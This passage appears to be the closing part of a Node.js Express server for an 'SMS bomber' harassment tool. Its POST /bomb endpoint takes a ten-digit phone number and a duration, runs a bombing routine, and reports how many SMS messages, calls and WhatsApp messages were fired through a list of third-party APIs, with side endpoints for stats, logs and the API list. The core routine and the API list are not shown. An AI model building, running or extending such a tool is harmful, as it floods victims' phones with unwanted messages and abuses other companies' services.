            rejected_4xx: 0, failed_5xx: 0, network_error: 0, lastStatus: null,
            lastStatusCode: null, lastTime: null, lastError: null, avgResponseTime: 0,
            isRateLimited: stats[key].isRateLimited
        };
    }
    recentLogs.length = 0;
    logEvent('Stats reset', 'warn');
    res.json({ success: true });
});

app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;
    if (!phone || phone.length !== 10) return res.status(400).json({ error: 'Invalid phone number.' });

    const requestedDuration = Number(duration) || 1;
    const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);

    console.log(`\n📱 Bombing ${phone} | Requested: ${requestedDuration}min | Effective: ${effectiveDuration}min`);

    try {
        const result = await runBombing(phone, effectiveDuration);
        console.log(`✅ DONE | ${phone} | OK: ${result.success} | RL: ${result.rateLimited} | Rejected: ${result.rejected} | Failed: ${result.failed} | ${result.elapsed}s\n`);
        res.json({
            success: true, phone,
            requested_duration: requestedDuration,
            effective_duration: effectiveDuration,
            instance: instance || 'default',
            totalSent: result.success,
            sms: result.smsCount,
            calls: result.callCount,
            whatsapp: result.whatsappCount,
            rate_limited: result.rateLimited,
            rejected: result.rejected,
            failed: result.failed,
            elapsed: result.elapsed + 's',
            total_apis: uniqueApis.length
        });
    } catch (error) {
        console.error('Bombing error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/apis', (req, res) => {
    res.json({
        total: uniqueApis.length,
        normal: NORMAL_APIS.length,
        rate_limited: RATE_LIMIT_APIS.length,
        normal_api_names: NORMAL_APIS.map(a => a.name),
        rate_limited_api_names: RATE_LIMIT_APIS.map(a => a.name)
    });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log('═══════════════════════════════════════════');
    console.log(`🚀 API Server on port ${PORT}`);
    console.log(`📊 Total: ${uniqueApis.length} | Normal: ${NORMAL_APIS.length} | RL: ${RATE_LIMIT_APIS.length}`);
    console.log(`⏱️ Max duration: ${MAX_DURATION_MIN} min`);
    console.log('═══════════════════════════════════════════');
    console.log('Endpoints:');
    console.log('  GET  /              Status');
    console.log('  GET  /health        Health');
    console.log('  GET  /test?phone=X  Test all');
    console.log('  GET  /stats         Working/RL/Rejected/Failed');
    console.log('  GET  /logs          Recent logs');
    console.log('  GET  /apis          List');
    console.log('  POST /bomb          Bombing');
    console.log('═══════════════════════════════════════════');
});
